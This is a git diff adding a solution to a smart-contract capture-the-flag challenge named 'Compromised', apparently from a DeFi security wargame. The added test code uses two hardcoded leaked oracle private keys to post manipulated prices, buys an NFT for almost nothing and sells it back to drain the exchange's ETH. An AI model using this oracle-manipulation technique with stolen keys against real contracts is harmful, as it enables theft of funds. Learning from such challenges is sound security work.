@@ -20,17 +20,17 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
-        
+
         // Initialize balance of the trusted source addresses
         for (let i = 0; i < sources.length; i++) {
             setBalance(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
             expect(await ethers.provider.getBalance(sources[i])).to.equal(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
         }
-        
+
         // Player starts with limited balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
-        
+
         // Deploy the oracle and setup the trusted sources with initial prices
         const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
         oracle = await (await ethers.getContractFactory('TrustfulOracle', deployer)).attach(
@@ -53,21 +53,72 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Create a Wallet instance from the private key
+        const pk1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        const pk2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+
+        const source1 = (new ethers.Wallet(pk1)).connect(ethers.provider);
+        console.log("Source 1: ", source1.address);
+
+        const source2 = (new ethers.Wallet(pk2)).connect(ethers.provider);
+        console.log("Source 2: ", source2.address);
+
+
+        let priceBefore = await oracle.getMedianPrice('DVNFT');
+
+        console.log("Setting source1 price...")
+        await oracle.connect(source1).postPrice('DVNFT', 0);
+
+        console.log("Setting source2 price...")
+        await oracle.connect(source2).postPrice('DVNFT', 0);
+
+        let priceAfter = await oracle.getMedianPrice('DVNFT');
+
+        console.log("price before", priceBefore);
+        console.log("price after1", priceAfter);
+
+        console.log("Buying NFT...")
+        let tx = await exchange.connect(player).buyOne({ value: (2n * 10n ** 16n) });
+        console.log("NFT buy tx: ", tx);
+
+        let receipt = await tx.wait();
+        console.log("NFT buy receipt: ", receipt);
+
+        let jackpot = await ethers.provider.getBalance(exchange.address);
+
+        await oracle.connect(source1).postPrice('DVNFT', jackpot);
+        await oracle.connect(source2).postPrice('DVNFT', jackpot);
+
+        priceAfter = await oracle.getMedianPrice('DVNFT');
+        console.log("price after2", priceAfter);
+
+        console.log("Selling NFT...")
+        const event = receipt.events.find(event => event.event === "TokenBought");
+        if (event) {
+            console.log("TokenBought", event);
+
+            await nftToken.connect(player).approve(exchange.address, event.args.tokenId);
+            await exchange.connect(player).sellOne(event.args.tokenId);
+        } else {
+            console.log("TokenBought event not found in the transaction receipt.");
+        }
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(exchange.address)
         ).to.be.eq(0);
-        
+
         // Player's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(player.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Player must not own any NFT
         expect(
             await nftToken.balanceOf(player.address)
